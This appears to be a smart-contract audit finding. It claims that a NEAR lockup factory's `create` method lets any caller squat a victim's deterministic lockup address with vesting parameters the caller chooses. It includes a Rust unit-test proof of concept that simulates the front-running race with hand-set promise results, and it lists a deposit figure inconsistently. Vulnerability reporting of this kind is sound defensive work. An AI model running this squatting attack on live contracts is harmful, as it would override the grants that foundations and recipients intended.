### Title
`LockupFactory::create` deploys a deterministic lockup address with attacker-chosen `vesting_schedule`/`release_duration` for any `owner_account_id`, permanently squatting the legitimate grantor's intended account - (File: `lockup-factory/src/lib.rs`)

### Summary
`LockupFactory::create` never checks that `env::predecessor_account_id()` is the entity entitled to grant tokens to `owner_account_id`; any unprivileged caller who attaches `MIN_ATTACHED_BALANCE` can call it first with an arbitrary `owner_account_id` and attacker-chosen `vesting_schedule`/`release_duration`. Because the lockup account name is `sha256(owner_account_id)[..20].<factory>` — a pure function of `owner_account_id` — this squats the one and only deterministic address that a legitimate grantor (e.g. the foundation) would later target, permanently substituting the attacker's vesting parameters for the ones the rightful grantor intended.

### Finding Description
The claimed binding is: `LockupArgs` stored at `sha256(owner_account_id)[..20].<factory>` == the `vesting_schedule`/`release_duration`/other args that the party entitled to grant `owner_account_id` a lockup actually submitted.

In `lockup-factory/src/lib.rs`, `create` (lines 107–166) only asserts `env::attached_deposit() >= MIN_ATTACHED_BALANCE` [1](#0-0) . There is no `assert_owner`, `assert_called_by_foundation`, allow-list check, or any comparison of `env::predecessor_account_id()` against `owner_account_id` or against `self.foundation_account_id` before the lockup contract is deployed with attacker-supplied `vesting_schedule`/`release_duration`. The target account name is derived solely from `owner_account_id`: [2](#0-1) 

and the `Promise::new(lockup_account_id).create_account().deploy_contract(...).transfer(...).function_call("new", LockupArgs{...})` batch is scheduled unconditionally with the caller's own chosen `vesting_schedule` / `release_duration` [3](#0-2) .

Exploit flow: attacker submits `create(owner_account_id = <victim>, vesting_schedule = <attacker-chosen>, release_duration = <attacker-chosen>, ...)` with `MIN_ATTACHED_BALANCE` attached, racing ahead of (or in the same block as) the legitimate grantor's transaction. Because NEAR account creation (`create_account`) is a one-shot, name-exclusive action, whichever transaction's receipt executes first wins the deterministic name; the loser's `create_account` action fails, the whole batch fails, and `on_lockup_create`'s `is_promise_success()` check refunds the loser's deposit [4](#0-3) . If the attacker wins the race, the address permanently holds `LockupArgs` with the attacker's `vesting_schedule`/`release_duration` for `owner_account_id = <victim>`, and the legitimate grantor can never deploy the intended lockup at that address again (the name is taken forever).

None of the listed guards apply here: `assert_self()` only fires in the callback (post-creation), `is_promise_success()` only decides refund-vs-not, and there is no `assert_owner`/`assert_called_by_foundation` anywhere in `create`.

### Impact Explanation
This falls squarely under the Critical category "an account whitelisted or a lockup deployed with parameters its rightful creator never chose." A victim's lockup name gets permanently bound to attacker-chosen `vesting_schedule` and `release_duration` instead of the parameters the legitimate grantor intended, and the legitimate grantor's later attempt is blocked forever at that address (the naming scheme has no retry/alternate-address mechanism). This is repeatable against any `owner_account_id` the attacker chooses to target, for the cost of one `MIN_ATTACHED_BALANCE` (3.5 NEAR) per victim address, so the blast radius spans every future lockup grant the factory would ever issue.

### Likelihood Explanation
Preconditions are minimal: the attacker needs only a NEAR account and `MIN_ATTACHED_BALANCE` (3.5 NEAR), both trivially obtainable by any unprivileged actor. No special role, key, or timing beyond "submit before/alongside the legitimate grantor's transaction" is required, and `owner_account_id` values for intended grants are often predictable/public (e.g. known team/investor account names). The attack is fully repeatable across arbitrary victim accounts, each attempt costing a fixed, small deposit.

### Recommendation
Restrict `create` to only the entities entitled to grant lockups to a given owner — e.g. require `env::predecessor_account_id() == self.foundation_account_id` (or an equivalent allow-list/owner check), removing the ability for arbitrary unprivileged callers to pre-empt the deterministic lockup address for any `owner_account_id` with self-chosen vesting parameters.

### Proof of Concept
```rust
// lockup-factory/src/lib.rs (tests module)
#[test]
fn test_attacker_can_squat_owner_lockup_with_own_vesting_schedule() {
    let mut context = VMContextBuilder::new()
        .current_account_id(account_factory())
        .predecessor_account_id(account_near())
        .finish();
    testing_env!(context.clone());

    let mut contract = LockupFactory::new(whitelist_account_id(), foundation_account_id());

    // Attacker-chosen schedule, NOT what the legitimate grantor (foundation) intends.
    let attacker_schedule = Some(VestingScheduleOrHash::VestingHash(
        VestingScheduleWithSalt {
            vesting_schedule: new_vesting_schedule(0), // attacker picks arbitrary offset
            salt: SALT.to_vec().into(),
        }
        .hash()
        .into(),
    ));

    const LOCKUP_DURATION: u64 = 63036000000000000;
    let lockup_duration: WrappedTimestamp = LOCKUP_DURATION.into();

    // 1. Attacker calls create() for the victim's owner_account_id, unprivileged,
    //    with attacker-chosen vesting_schedule/release_duration.
    context.is_view = false;
    context.predecessor_account_id = String::from("attacker.near"); // NOT foundation, NOT owner
    context.attached_deposit = ntoy(35); // just MIN_ATTACHED_BALANCE
    testing_env!(context.clone());
    contract.create(
        account_tokens_owner(),      // victim owner_account_id
        lockup_duration,
        None,
        attacker_schedule.clone(),   // attacker's own choice
        Some(WrappedDuration::from(1u64)), // attacker's own release_duration
        None,
    );

    // 2. Attacker's promise "wins" the race for the deterministic address.
    context.predecessor_account_id = account_factory();
    context.attached_deposit = ntoy(0);
    testing_env_with_promise_results(context.clone(), PromiseResult::Successful(vec![]));
    let created = contract.on_lockup_create(
        lockup_account(), // sha256(account_tokens_owner())[..20].factory — fixed name
        ntoy(30).into(),
        String::from("attacker.near"),
    );
    assert!(created); // attacker's malicious LockupArgs now live at the victim's address

    // 3. Legitimate grantor (foundation) now tries to create the real lockup
    //    for the same owner_account_id with the intended schedule — fails
    //    because the account name is already taken (simulated via Failed result),
    //    proving the address is permanently squatted with attacker's parameters.
    context.predecessor_account_id = String::from(foundation_account_id().as_ref());
    context.attached_deposit = ntoy(35);
    testing_env!(context.clone());
    contract.create(
        account_tokens_owner(),
        lockup_duration,
        None,
        None, // foundation's real intended schedule (None/legit)
        None,
        None,
    );
    context.predecessor_account_id = account_factory();
    context.attached_deposit = ntoy(0);
    testing_env_with_promise_results(context.clone(), PromiseResult::Failed); // create_account fails: name taken
    let legit_created = contract.on_lockup_create(
        lockup_account(),
        ntoy(35).into(),
        String::from(foundation_account_id().as_ref()),
    );
    assert_eq!(legit_created, false); // legitimate grant permanently blocked at this address
}
```
This demonstrates: (a) `create` has no check equating `predecessor_account_id` to `owner_account_id` or the foundation, so an unprivileged attacker's `LockupArgs.vesting_schedule`/`release_duration` are the ones deployed at the deterministic address; (b) the legitimate grantor's subsequent, identically-named `create` call is permanently defeated, satisfying "a lockup deployed with parameters its rightful creator never chose."

    pub fn on_lockup_create(
        &mut self,
        lockup_account_id: AccountId,
        attached_deposit: U128,
        predecessor_account_id: AccountId,
    ) -> bool {
        assert_self();

        let lockup_account_created = is_promise_success();

        if lockup_account_created {
            env::log(
                format!("The lockup contract {} was successfully created.", lockup_account_id)
                    .as_bytes(),
            );
            true
        } else {
            env::log(
                format!(
                    "The lockup {} creation has failed. Returning attached deposit of {} to {}",
                    lockup_account_id, attached_deposit.0, predecessor_account_id
                )
                    .as_bytes(),
            );
            Promise::new(predecessor_account_id).transfer(attached_deposit.0);
            false
        }
    }
